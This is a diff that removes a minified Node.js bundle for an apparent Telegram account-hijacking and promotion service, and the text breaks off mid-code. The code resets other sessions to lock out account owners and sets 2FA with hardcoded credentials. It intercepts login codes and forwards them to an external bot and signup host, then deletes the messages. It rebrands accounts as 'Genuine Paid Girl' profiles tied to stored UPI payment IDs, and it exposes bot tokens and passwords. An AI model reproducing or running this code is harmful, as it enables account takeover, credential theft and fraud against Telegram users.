@@ -1,2 +1,3612 @@
-(()=>{var e={167:e=>{"use strict";e.exports=require("axios")},986:e=>{"use strict";e.exports=require("body-parser")},518:e=>{"use strict";e.exports=require("cloudinary")},582:e=>{"use strict";e.exports=require("cors")},142:e=>{"use strict";e.exports=require("dotenv")},860:e=>{"use strict";e.exports=require("express")},390:e=>{"use strict";e.exports=require("imap")},13:e=>{"use strict";e.exports=require("mongodb")},391:e=>{"use strict";e.exports=require("node-schedule-tz")},777:e=>{"use strict";e.exports=require("swagger-jsdoc")},948:e=>{"use strict";e.exports=require("swagger-ui-express")},156:e=>{"use strict";e.exports=require("telegram")},671:e=>{"use strict";e.exports=require("telegram/client/uploads")},819:e=>{"use strict";e.exports=require("telegram/events/index.js")},436:e=>{"use strict";e.exports=require("telegram/sessions")},81:e=>{"use strict";e.exports=require("child_process")},147:e=>{"use strict";e.exports=require("fs")},17:e=>{"use strict";e.exports=require("path")},459:(e,t,n)=>{console.log("in Cloudinary");const s=n(518),a=n(17),o=n(147),{fetchWithTimeout:i}=n(613);class c{static instance;resources=new Map;constructor(){s.v2.config({cloud_name:process.env.CL_NAME,api_key:process.env.CL_APIKEY,api_secret:process.env.CL_APISECRET})}static async getInstance(e){return c.instance||(c.instance=new c),await c.instance.getResourcesFromFolder(e),c.instance}async getResourcesFromFolder(e){console.log("FETCHING NEW FILES!! from CLOUDINARY"),await this.findAndSaveResources(e,"image")}async createNewFolder(e){await this.createFolder(e),await this.uploadFilesToFolder(e)}async overwriteFile(){try{const e=await s.v2.uploader.upload("./src/test.js",{resource_type:"auto",overwrite:!0,invalidate:!0,public_id:"index_nbzca5.js"});console.log(e)}catch(e){console.log(e)}}async findAndSaveResources(e,t){try{const{resources:n}=await s.v2.api.resources({resource_type:t,type:"upload",prefix:e,max_results:500});n.forEach((async e=>{try{this.resources.set(e.public_id.split("/")[1].split("_")[0],e.url),await async function(e,t){const n=e.substring(e.lastIndexOf(".")+1,e.length),s=a.resolve(__dirname,`./${t}.${n}`);i(e,{responseType:"arraybuffer"},2).then((a=>{if("OK"!==a?.statusText)throw new Error(`Unable to download file from ${e}`);try{o.existsSync(s)?(o.unlinkSync(s),o.writeFileSync(s,a.data,"binary"),console.log(`${t}.${n} Replaced!!`)):(o.writeFileSync(s,a.data,"binary"),console.log(`${t}.${n} Saved!!`))}catch(e){console.error(e)}})).catch((e=>{console.error(e)}))}(e.url,e.public_id.split("/")[1].split("_")[0])}catch(t){console.log(e),console.log(t)}}))}catch(e){console.log(e)}}async createFolder(e){try{return await s.v2.api.create_folder(e)}catch(e){throw console.error("Error creating folder:",e),e}}async uploadFilesToFolder(e){const t=Array.from(this.resources.entries()).map((async([t,n])=>{try{return await s.v2.uploader.upload_large(n,{folder:e,resource_type:"auto",public_id:t})}catch(e){throw console.error("Error uploading file:",e),e}}));try{return await Promise.all(t)}catch(e){throw console.error("Error uploading files:",e),e}}async printResources(){try{this.resources?.forEach(((e,t)=>{console.log(t,":",e)}))}catch(e){console.log(e)}}get(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}getBuffer(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}}e.exports={CloudinaryService:c}},213:(e,t,n)=>{const{MongoClient:s,ServerApiVersion:a}=n(13);class o{static instance;client=void 0;db=void 0;users=void 0;statsDb=void 0;statsDb2=void 0;isConnected=!1;constructor(){}static getInstance(){return o.instance||(o.instance=new o),o.instance}static isInstanceExist(){return!!o.instance}async connect(){if(this.isConnected)console.log("MongoConnection ALready Existing");else{console.log("trying to connect to DB......");try{return this.client=await s.connect(process.env.mongouri,{useNewUrlParser:!0,useUnifiedTopology:!0,serverApi:a.v1,maxPoolSize:15}),console.log("Connected to MongoDB"),this.isConnected=!0,this.client.on("close",(()=>{console.log("MongoDB connection closed."),this.isConnected=!1})),this.db=this.client.db("tgclients").collection("channels"),this.users=this.client.db("tgclients").collection("users"),this.statsDb=this.client.db("tgclients").collection("stats"),this.statsDb2=this.client.db("tgclients").collection("stats2"),!0}catch(e){return console.log(`Error connecting to MongoDB: ${e}`),!1}}}async insertChannel(e){const{title:t,id:n,username:s,megagroup:a,participantsCount:o,broadcast:i}=e,c=e.defaultBannedRights?.sendMessages,l={channelId:n.toString()};await(this.db?.findOne(l))||c||i||await this.db.insertOne({channelId:n.toString(),username:s?`@${s}`:null,title:t,megagroup:a,participantsCount:o})}async getChannels(e=50,t=0,n){const s={megagroup:!0,username:{$ne:null}},a={participantsCount:-1};n&&(s.$or=[{title:{$regex:n,$options:"i"}},{username:{$regex:n,$options:"i"}}]);const o={collation:{locale:"en",strength:1}};try{return n&&await(this.db?.createIndex({title:"text"})),await this.db.find(s,o).sort(a).skip(t).limit(e).toArray()}catch(e){return console.error("Error:",e),[]}}async insertUser(e){const t={mobile:e.mobile};try{await this.users.findOne(t)||await this.users.insertOne(e)}catch(e){console.log(e)}}async updateUser(e,t){const n={mobile:e.mobile};try{await this.users.updateOne(n,{$set:{...t}},{upsert:!0})}catch(e){console.log(e)}}async deleteUser(e){const t={mobile:e.mobile};try{await this.users.deleteOne(t)}catch(e){console.log(e)}}async getUser(e){const t={mobile:e.mobile};try{return await this.users.findOne(t)}catch(e){return void console.log(e)}}async getTempUser(){try{return await this.users.findOne({})}catch(e){console.log(e)}}async getUsersFullData(e=2,t=0){return await(this.users?.find({}).skip(t).limit(e).sort({_id:1}).toArray())||void 0}async insertInBufferClients(e){const t={mobile:e.mobile};try{const n=this.client.db("tgclients").collection("bufferClients");await n.updateOne(t,{$set:{...e}},{upsert:!0})}catch(e){console.log(e)}}async readBufferClients(e,t){const n=this.client.db("tgclients").collection("bufferClients"),s=e||{},a=t?n.find(s).limit(t):n.find(s),o=await a.toArray();return o?.length>0?o:[]}async getOneBufferClient(){const e=this.client.db("tgclients").collection("bufferClients");return await e.findOne({})||void 0}async deleteBufferClient(e){const t={mobile:e.mobile},n=this.client.db("tgclients").collection("bufferClients");try{await n.deleteOne(t)}catch(e){console.log(e)}}async getNewBufferClients(e){return this.users.find({mobile:{$nin:e},twoFA:{$exists:!1}}).sort({lastActive:1}).limit(20)}async readPromoteStats(){const e=this.client.db("tgclients").collection("promoteStats"),t=await e.find({},{projection:{client:1,totalCount:1,lastUpdatedTimeStamp:1,isActive:1,_id:0}}).sort({totalCount:-1}).toArray();return t.length>0?t:void 0}async readSinglePromoteStats(e){const t=this.client.db("tgclients").collection("promoteStats");return await t.findOne({client:e},{projection:{client:1,totalCount:1,lastUpdatedTimeStamp:1,isActive:1,_id:0}})}async readStats(){const e=await this.statsDb.find({}).sort({newUser:-1});return e?e.toArray():void 0}async read(e){return await this.db.findOne({chatId:e})||void 0}async removeOnefromChannel(e){try{await this.db.deleteOne(e)}catch(e){console.log(e)}}async getUsers(e,t=0){return await(this.users?.find({},{projection:{firstName:1,userName:1,mobile:1,_id:0}}).skip(t).limit(e).toArray())||void 0}async getupi(e){const t=this.client.db("tgclients").collection("upi-ids");return(await t.findOne({}))[e]||"lakshmi-69@paytm"}async getAllUpis(){const e=this.client.db("tgclients").collection("upi-ids");return await e.findOne({})}async updateUpis(e){const t=this.client.db("tgclients").collection("upi-ids");return await t.updateOne({},{$set:{...e}})}async getBuilds(){const e=this.client.db("tgclients").collection("builds");return await e.findOne({})}async updateBuilds(e){const t=this.client.db("tgclients").collection("builds");return await t.updateOne({},{$set:{...e}},{upsert:!0})}async getUserConfig(e){const t=this.client.db("tgclients").collection("clients");return await t.findOne(e)}async updateUserConfig(e,t){const n=this.client.db("tgclients").collection("clients");return(await n.findOneAndUpdate(e,{$set:{...t}},{returnOriginal:!1})).value}async insertInAchivedClient(e){const t=this.client.db("tgclients").collection("ArchivedClients");return await t.updateOne({number:e.number},{$set:{...e}},{upsert:!0})}async getInAchivedClient(e){const t=this.client.db("tgclients").collection("ArchivedClients");return await t.findOne(e)}async getAllUserClients(){const e=this.client.db("tgclients").collection("clients");return await e.aggregate([{$project:{_id:0,session:0,number:0,password:0}}]).toArray()}async getTgConfig(){const e=this.client.db("tgclients").collection("configuration");return await e.findOne({apiId:"1591339"})}async updateTgConfig(e){const t=this.client.db("tgclients").collection("configurations");return await t.updateOne({},{$set:{...e}})}async processUsers(e=void 0,t=void 0){return this.users.find({lastUpdated:{$exists:!1}}).limit(e||300).skip(t||0)}async clearStats(){const e=await this.statsDb.deleteMany({payAmount:{$lt:5}});console.log(e)}async clearStats2(){const e=await(this.statsDb2?.deleteMany({}));console.log(e)}async clearPromotionStats(){const e=this.client.db("tgclients").collection("promoteStats"),t=await e.deleteMany({});console.log(t)}async closeConnection(){try{this.isConnected&&(this.isConnected=!1,console.log("MongoDB connection closed.")),await(this.client?.close())}catch(e){console.log(e)}}async getCurrentActiveUniqueChannels(){const e=this.client.db("tgclients").collection("promoteStats").find({}),t=new Set;return await e.forEach((e=>{for(const n in e.data)t.add(n)})),Array.from(t)}async initPromoteStats(){const e=this.client.db("tgclients").collection("promoteStats"),t=await this.getAllUserClients();for(const n of t){const t={client:n.clientId,data:{},totalCount:0,uniqueChannels:0,lastupdatedTimeStamp:Date.now()};await e.findOne({client:n.clientId})||await e.insertOne(t)}}async getActiveChannels(e=50,t=0,n=[],s=[],a="activeChannels"){const o=new RegExp(n.join("|"),"i"),i=new RegExp("online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser","i");let c={$and:[{username:{$ne:null}},{$or:[{title:{$regex:o}},{username:{$regex:o}}]},{channelId:{$nin:s}},{title:{$not:{$regex:i}}},{username:{$not:{$regex:i}}}]};const l={participantsCount:-1},r=this.client.db("tgclients").collection(a);try{return await r.find(c).sort(l).skip(t).limit(e).toArray()}catch(e){return console.error("Error:",e),[]}}async updateActiveChannels(){try{const e=this.client.db("tgclients").collection("promoteStats"),t=this.client.db("tgclients").collection("activeChannels"),n=e.find({}),s=new Set;await n.forEach((e=>{for(const t in e.data)t&&s.add(t)}));const a=Array.from(s),o=this.client.db("tgclients").collection("channels");for(const e of a)if(!await t.findOne({username:`@${e}`},{projection:{_id:0}})){const n=await o.findOne({username:`@${e}`},{projection:{_id:0}});n&&await t.insertOne(n)}}catch(e){console.log(e)}}async removeOnefromActiveChannel(e){try{const t=this.client.db("tgclients").collection("activeChannels");await t.deleteOne(e)}catch(e){console.log(e)}}}e.exports=o},365:(e,t,n)=>{const s=n(390);console.log("Started Mail Reader");let a=!1;const o=new s({user:process.env.GMAIL_ADD,password:process.env.GMAIL_PASS,host:"imap.gmail.com",port:993,tls:!0,tlsOptions:{rejectUnauthorized:!1}});o.once("ready",(function(){return console.log("ready"),a=!0,!0})),o.once("error",(e=>{console.error("SomeError :",e)})),o.once("end",(()=>{console.log("Connection ended")}));let i="";e.exports={getcode:async function(){return await async function(e){o.openBox("INBOX",!1,(()=>{const e={bodies:["HEADER","TEXT"],markSeen:!0};o.search([["FROM","noreply@telegram.org"]],((t,n)=>{if(t)throw t;if(console.log(n),n.length>0){const t=o.fetch([n[n.length-1]],e);t.on("message",((e,t)=>{const s=[];e.on("body",((e,n)=>{let a="";e.on("data",(e=>{a+=e.toString("utf8")})),e.on("end",(()=>{"TEXT"===n.which&&s.push(a),o.seq.addFlags([t],"\\Deleted",(e=>{if(e)throw e;o.expunge((e=>{if(e)throw e;console.log("Deleted message")}))}))}))})),e.once("end",(()=>{console.log(`Email #${t}, Latest${n[n.length-1]}`),console.log("EmailDataLength: ",s.length),console.log("Mail:",s[s.length-1].split(".")),i=function(e){const t=/\d+/g,n=e.match(t);return n?n.join(""):""}(s[s.length-1].split(".")[0])}))})),t.once("end",(()=>{console.log("fetched mails")}))}}))}))}(),console.log("Returning from mail Reader:",i),i.length>4&&o.end(),i},isMailReady:function(){return a},connectToMail:function(){i="",o.connect()},disconnectfromMail:function(){i="",o.end()}}},972:(e,t,n)=>{const s=n(777)({definition:{openapi:"3.0.0",info:{title:"ReddyGirl",version:"1.0.0",description:"API documentation for your Express application"}},apis:["./index.js"]});e.exports=s},98:(e,t,n)=>{const{TelegramClient:s,Api:a}=n(156),{NewMessage:o}=n(819),i=n(167),{StringSession:c}=n(436),{isMailReady:l,getcode:r,connectToMail:d,disconnectfromMail:g}=n(365),{CustomFile:u}=n(671),{sleep:m}=n(613),p=n(147),w=n(213),h=new Map;let y;function f(e){return h.get(e)}async function b(e){const t=f(e);return await(t?.disconnect()),h.delete(e)}class v{constructor(e,t){this.session=new c(e),this.phoneNumber=t,this.client=null,this.expired=!1,this.channelArray=[]}async disconnect(){await this.client.disconnect(),await this.client.destroy(),this.session.delete()}async createClient(e=!0){try{this.client=new s(this.session,parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:5}),console.log("Stating Client - ",this.phoneNumber),await this.client.connect();const t=await this.client.getMessages("me",{limit:8});e?setTimeout((async()=>{this.client.connected||h.get(this.phoneNumber)?(console.log("SELF destroy client"),await this.client.disconnect(),await this.client.destroy(),this.session.delete()):console.log("Client Already Disconnected"),h.delete(this.phoneNumber)}),18e4):setInterval((async()=>{await this.client.connect()}),2e4),this.client.addEventHandler((async e=>{await this.handleEvents(e)}),new o);const n=await(this.client?.getDialogs({limit:500}));console.log("TotalChats:",n.total),this.expired={msgs:t.total,total:n.total}}catch(e){console.log(e),this.expired=void 0}}async getLastMsgs(e){const t=await this.client.getMessages("777000",{limit:parseInt(e)});let n="";return t.forEach((e=>{console.log(e.text),n=n+e.text+"\n"})),n}async channelInfo(e=!1){const t=await(this.client?.getDialogs({limit:600}));let n=0,s=0,a=0;return this.channelArray.length=0,console.log(t.total),t.map((async e=>{if(e.isChannel||e.isGroup)try{const t=await e.entity.toJSON(),{broadcast:o,defaultBannedRights:i}=t;a++,o||i?.sendMessages?s++:(n++,this.channelArray.push(t.id.toString()))}catch(e){console.log(e)}})),{chatsArrayLength:a,canSendTrueCount:n,canSendFalseCount:s,ids:e?this.channelArray:[]}}async joinChannels(e){const t=w.getInstance(),n=e.split("|");console.log(this.phoneNumber," - channelsLen - ",n.length);for(let e=0;e<n.length;e++){const s=n[e].trim();console.log(this.phoneNumber,"Trying: ",s);try{await this.client.invoke(new a.channels.JoinChannel({channel:await this.client.getEntity(s)})),console.log(this.phoneNumber," - Joined channel Sucesss - ",s);try{const e=await this.client.getEntity(s),{title:n,id:a,broadcast:o,defaultBannedRights:i,participantsCount:c,restricted:l,username:r}=e,d={id:a.toString(),title:n,participantsCount:c,username:r,restricted:l,broadcast:o,sendMessages:i?.sendMessages,canSendMsgs:!1};if(e.broadcast||i?.sendMessages)await t.removeOnefromActiveChannel({username:s.replace("@","")}),await t.removeOnefromChannel({username:s.startsWith("@")?s:`@${s}`}),console.log("Removed Cahnnel- ",s);else{d.canSendMsgs=!0;try{await t.updateActiveChannels(d.id.toString(),d),console.log("updated ActiveChannels")}catch(e){console.log(e),console.log("Failed to update ActiveChannels")}}}catch(e){console.log(this.phoneNumber," - Failed - ",e)}}catch(e){console.log("Channels ERR: ",e),(e.toString().includes("No user has")||e.toString().includes("USERNAME_INVALID"))&&(await t.removeOnefromActiveChannel({username:s.replace("@","")}),await t.removeOnefromChannel({username:s}),console.log("Removed Cahnnel- ",s))}console.log(this.phoneNumber," - On waiting period"),await new Promise((e=>setTimeout(e,18e4))),console.log(this.phoneNumber," - Will Try next")}console.log(this.phoneNumber," - finished joining channels"),await this.client.disconnect(),await b(this.phoneNumber)}async removeOtherAuths(){const e=(await this.client.invoke(new a.account.GetAuthorizations({}))).authorizations.map((e=>e.country.toLowerCase().includes("singapore")||e.deviceModel.toLowerCase().includes("oneplus")||e.deviceModel.toLowerCase().includes("cli")||e.deviceModel.toLowerCase().includes("linux")||e.appName.toLowerCase().includes("likki")||e.appName.toLowerCase().includes("rams")||e.appName.toLowerCase().includes("sru")||e.appName.toLowerCase().includes("shru")||e.deviceModel.toLowerCase().includes("windows")?e:(this.client.invoke(new a.account.ResetAuthorization({hash:e.hash})),null))).filter(Boolean);console.log(e)}async getAuths(){return await this.client.invoke(new a.account.GetAuthorizations({}))}async hasPassword(){return(await this.client.invoke(new a.account.GetPassword)).hasPassword}async blockAllUsers(){const e=await(this.client?.getDialogs({limit:600}));for(let t of e)t.isUser&&await this.blockAUser(t.id),m(5e3)}async blockAUser(e){await this.client.invoke(new a.contacts.Block({id:e}))}async getLastActiveTime(){const e=await this.client.invoke(new a.account.GetAuthorizations({}));let t=0;return e.authorizations.map((e=>{e.country.toLowerCase().includes("singapore")||t<e.dateActive&&(t=e.dateActive)})),t}async getMe(){return await this.client.getMe()}async deleteProfilePhotos(){try{const e=await this.client.invoke(new a.photos.GetUserPhotos({userId:"me"}));console.log(e),e&&e.photos?.length>0&&await this.client.invoke(new a.photos.DeletePhotos({id:e.photos})),console.log("Deleted profile Photos")}catch(e){console.log(e)}}async set2fa(){d();const e=setInterval((async()=>{l()&&(clearInterval(e),await this.client.updateTwoFaSettings({isCheckPassword:!1,email:"storeslaksmi@gmail.com",hint:"password - India143",newPassword:"Ajtdmwajt1@",emailCodeCallback:async e=>(console.log("code sent"),new Promise((async e=>{let t=0;const n=setInterval((async()=>{if(console.log("checking code"),t++,l()&&t<4){const t=await r();""!==t&&(clearInterval(n),g(),e(t))}else clearInterval(n),await this.client.disconnect(),await b(this.phoneNumber),g(),e(code)}),6e3)}))),onEmailCodeError:e=>(console.log(e),Promise.resolve("error"))}))}),5e3)}async updatePrivacyforDeletedAccount(){try{await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneCall({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyProfilePhoto({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneNumber({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyStatusTimestamp({}),rules:[new a.InputPrivacyValueDisallowAll]})),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyAbout({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated")}catch(e){console.log(e)}}async updateProfile(e,t){try{await this.client.invoke(new a.account.UpdateProfile({firstName:e,lastName:"",about:t})),console.log("Updated NAme: ",e)}catch(e){console.log(e)}}async updateUsername(e){let t="",n=e&&""!==e?e:"",s=0;if(""===n)try{await this.client.invoke(new a.account.UpdateUsername({username:n})),console.log("Removed Username successfully.")}catch(e){console.log(e)}else for(;;)try{const o=await this.client.invoke(new a.account.CheckUsername({username:n}));if(console.log(o," - ",n),o){await this.client.invoke(new a.account.UpdateUsername({username:n})),console.log(`Username '${n}' updated successfully.`),t=n;break}n=e+s,s++,await m(4e3)}catch(a){if(console.log(a.message),"USERNAME_NOT_MODIFIED"==a.errorMessage){t=n;break}n=e+s,s++}return t}async updateProfilePic(e){try{const t=await this.client.uploadFile({file:new u("pic.jpg",p.statSync(e).size,e),workers:1});console.log("file uploaded- ",t),await this.client.invoke(new a.photos.UploadProfilePhoto({file:t})),console.log("profile pic updated")}catch(e){console.log(e)}}async updatePrivacy(){try{await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneCall({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyProfilePhoto({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneNumber({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyStatusTimestamp({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyAbout({}),rules:[new a.InputPrivacyValueAllowAll]}))}catch(e){console.log(e)}}async handleEvents(e){if(e.isPrivate&&"777000"==e.message.chatId.toString()){if(console.log("Login Code received for - ",this.phoneNumber,"\nSetup - ",y),y&&this.phoneNumber===y?.phoneNumber){console.log("LoginText: ",e.message.text);const t=e.message.text.split(".")[0].split("code:**")[1].trim();console.log("Code is:",t);try{await i.get(`https://tgsignup.onrender.com/otp?code=${t}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`),console.log("Code Sent")}catch(e){console.log(e)}await b(this.phoneNumber)}console.log(e.message.text.toLowerCase());const t={chat_id:"-1001801844217",text:e.message.text};i.post("https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage",t).then((e=>{})).catch((e=>{console.error("Error sending message:",e.response?.data?.description)})),await e.message.delete({revoke:!0})}}}e.exports={TelegramManager:v,hasClient:function(e){return h.has(e)},getClient:f,disconnectAll:async function(){const e=h.entries();console.log("Disconnecting All Clients");for(const[t,n]of e)try{await(n?.disconnect()),h.delete(t),console.log(`Client disconnected: ${t}`)}catch(e){console.log(e),console.log(`Failed to Disconnect : ${t}`)}},createClient:async function(e,t,n=!0){return h.has(e)?{msgs:10,total:10}:new Promise((async s=>{const a=new v(t,e);await a.createClient(n),a.expired&&h.set(e,a),s(a.expired)}))},deleteClient:b,getActiveClientSetup:function(){return y},setActiveClientSetup:function(e){y=e}}},613:(e,t,n)=>{const s=n(167);e.exports={sleep:function(e){return new Promise((t=>setTimeout(t,e)))},fetchWithTimeout:async function(e,t={},n=0){const a=t?.timeout||15e3,o=s.CancelToken.source(),i=setTimeout((()=>o.cancel()),a);for(let a=0;a<=n;a++)try{const n=await s({...t,url:e,cancelToken:o.token});return clearTimeout(i),n}catch(t){if(s.isCancel(t)?console.log("Request canceled:",t.message,e):console.log("Error:",t.message),!(a<n))return void console.error(`All ${n+1} retries failed for ${e}`);await new Promise((e=>setTimeout(e,2e3)))}}}}},t={};function n(s){var a=t[s];if(void 0!==a)return a.exports;var o=t[s]={exports:{}};return e[s](o,o.exports,n),o.exports}var s={};(()=>{"use strict";n(142).config();const e=n(860),t=n(167),s=n(391),a={timeZone:"Asia/Kolkata",timeZoneName:"short"},o=n(213),{getClient:i,hasClient:c,disconnectAll:l,createClient:r,deleteClient:d,setActiveClientSetup:g,getActiveClientSetup:u}=n(98),m=n(986),p=n(948),w=n(972),{sleep:h}=n(613),{fetchWithTimeout:y}=n(613),{execSync:f}=n(81),{CloudinaryService:b}=n(459);process.on("unhandledRejection",((e,t)=>{console.error("Unhandled Rejection at:",t,"reason:",e)})),process.on("exit",(async()=>{await o.getInstance().closeConnection(),await l()}));var v=n(582);const C=e(),A=new Map;let I,P,S;const $={};y("https://ipinfo.io/json").then((e=>e.data)).then((e=>{I=e,console.log(I)})).then((()=>{o.getInstance().connect().then((async()=>{setTimeout((async()=>{O.getinstance(),await k()}),100)}))})).catch((e=>console.error(e)));const x=()=>{let e;return e="bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA","https://api.telegram.org/bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA/sendMessage?chat_id=-1001801844217"},U=(process.env.apikey,"ALL_GOOD");async function k(){A.clear();const e=o.getInstance();await y(`${x()}&text=UptimeRobot : Refreshed Map`);const t=await e.getAllUserClients();P=t,S=await e.getAllUpis(),t.forEach((e=>{A.set(e.userName.toLowerCase(),{url:`${e.repl}/`,timeStamp:Date.now(),deployKey:e.deployKey,downTime:0,lastPingTime:Date.now(),clientId:e.clientId}),$[e.userName.toLowerCase()]=Date.now()}))}const D=[];try{s.scheduleJob("test3"," 25 2 * * * ","Asia/Kolkata",(async()=>{L();for(const e of A.values())try{(new Date).getUTCDate()%3==1&&await y(`${e.url}leavechannels`),R(e)}catch(e){console.log("Some Error: ",e.code)}await y("https://mychatgpt-pg6w.onrender.com/deletefiles")})),s.scheduleJob("test3"," 25 12 * * * ","Asia/Kolkata",(async()=>{R(),B()}))}catch(e){console.log("Some Error: ",e.code)}C.use(v()),C.use(m.json()),C.use("/api-docs",p.serve,p.setup(w)),C.get("/",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{})),C.get("/exitacc",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{})),C.get("/checkBufferClients",(async(e,t,n)=>{O.getinstance(),t.send("Checking Buffer Clients"),n()}),(async(e,t)=>{await L()})),C.get("/processUsers/:limit/:skip",(async(e,t,n)=>{t.send("ok"),n()}),(async(e,t)=>{const n=e.params.limit?e.params.limit:30,s=e.params.skip?e.params.skip:20,a=await o.getInstance(),c=await a.processUsers(parseInt(n),parseInt(s));for(;await c.hasNext();){const e=await c.next(),t=await r(e.mobile,e.session),n=await i(e.mobile);if(t){console.log(e.mobile," :  true");const s=await n.getLastActiveTime(),o=new Date(1e3*s).toISOString().split("T")[0],i=await n.getMe();await a.updateUser(e,{msgs:t.msgs,totalChats:t.total,lastActive:s,date:o,tgId:i.id.toString(),lastUpdated:(new Date).toISOString().split("T")[0]}),await(n?.disconnect(e.mobile)),await d()}else console.log(e.mobile," :  false"),await a.deleteUser(e)}console.log("finished")})),C.get("/refreshMap",(async(e,t)=>{O.getinstance(),await k(),t.send("Hello World!")})),C.get("/clearstats2",(async(e,t)=>{O.getinstance();const n=o.getInstance();await n.clearStats2(),t.send("Hello World!")})),C.get("/exit",(async(e,t)=>{await o.getInstance().closeConnection(),process.exit(1),t.send("Hello World!")})),C.post("/channels",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.body?.channels,s=o.getInstance();n?.forEach((async e=>{await s.insertChannel(e)}))}));let N=Date.now()-25e4;C.get("/setupClient/:clientId",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{if(Date.now()>N+24e4){N=Date.now();const n=e.params?.clientId,s=e?.query?.a;console.log(n,s),await async function(e,n){try{const s=await o.getInstance(),a=await s.getUserConfig({clientId:e});let c;if(n&&a){try{const e=await s.getUser({mobile:(a?.number.toString()).replace("+","")});e&&await r(e?.mobile,e?.session,!1)&&(c=await i(e.mobile),await c.deleteProfilePhotos(),await h(5e3),await c.updatePrivacyforDeletedAccount()),delete e._id,await s.insertInBufferClients({...e})}catch(e){console.log("Error updateing settings of old Client - ",e)}delete a._id,a.insertedDate=(new Date).toISOString().split("T")[0],await s.insertInAchivedClient(a),console.log("Archived old client")}const l=await s.getOneBufferClient();if(await d(l.mobile),await h(2e3),l&&await r(l.mobile,l.session,!1)){const n=await i(l.mobile),o=e.match(/[a-zA-Z]+/g).toString();await b.getInstance(o);const r=o[0].toUpperCase()+o.slice(1);g({phoneNumber:l.mobile,clientId:e});const d=await n.updateUsername(`${r}Redd`);c?.updateProfile("Deleted Account",`New ACC: @${d}`),await h(3e3),await n.deleteProfilePhotos(),await h(3e3),await n.updatePrivacy(),await h(3e3),await n.updateProfilePic("./dp1.jpg"),await h(1e3),await n.updateProfilePic("./dp2.jpg"),await h(1e3),await n.updateProfilePic("./dp3.jpg"),await h(1e3),await n.updateProfile(a.name,"Genuine Paid Girl🥰, Best Services❤️"),await h(3e3);const u=await s.getInAchivedClient({number:`+${l.mobile}`});u?await _(u,e):await async function(e){try{console.log("String Generation started"),await h(2e3),await t.get(`https://tgsignup.onrender.com/login?phone=${e}`),console.log("Code Sent successfully")}catch(e){console.log(e)}}(l.mobile)}}catch(e){console.log(e)}}(n.toString(),"yes"===s?.toLowerCase())}else console.log("Profile Setup Recently tried")})),C.get("/updateClient/:clientId",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{if(Date.now()>N+24e4){N=Date.now();const t=e.params?.clientId;console.log(t),await async function(e){try{const t=await o.getInstance(),n=await t.getUserConfig({clientId:e});if(n)try{const s=await t.getUser({mobile:(n?.number.toString()).replace("+","")});if(s&&await r(s?.mobile,s?.session)){const t=await i(s.mobile),a=e.match(/[a-zA-Z]+/g).toString();await b.getInstance(a);const o=a[0].toUpperCase()+a.slice(1);await t.updateUsername(`${o}Redd`),await h(5e3),await t.deleteProfilePhotos(),await h(3e3),await t.updatePrivacy(),await h(3e3),await t.updateProfilePic("./dp1.jpg"),await h(1e3),await t.updateProfilePic("./dp2.jpg"),await h(1e3),await t.updateProfilePic("./dp3.jpg"),await h(1e3),await t.updateProfile(n.name,"Genuine Paid Girl🥰, Best Services❤️")}}catch(e){console.log("Error updateing settings of old Client - ",e)}}catch(e){}}(t.toString())}else console.log("Profile Setup Recently tried")})),C.get("/getip",((e,t)=>{t.json(I)})),C.post("/users",(async(e,t,n)=>{t.send("Hello World!"),console.log(e.body),n()}),(async(e,t)=>{const n=e.body,s=o.getInstance(),a=i(n.mobile),c=u();a&&c?.phoneNumber===n.mobile?(g(void 0),console.log("New Session Generated"),await _(n,c),await d(n.mobile)):(await s.insertUser(n),await y(`${x()}&text=ACCOUNT LOGIN: ${n.userName?n.userName:n.firstName}:${n.msgs}:${n.totalChats}\n https://uptimechecker.onrender.com/connectclient/${n.mobile}`))})),C.get("/channels/:limit/:skip",(async(e,t,n)=>{const s=e.params.limit?e.params.limit:30,a=e.params.skip?e.params.skip:20,i=e.query?.k,c=o.getInstance(),l=await c.getChannels(parseInt(s),parseInt(a),i);let r="joinchannel:";for(const e of l)r=r+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";t.send(r)})),C.get("/activechannels/:limit/:skip",(async(e,t,n)=>{const 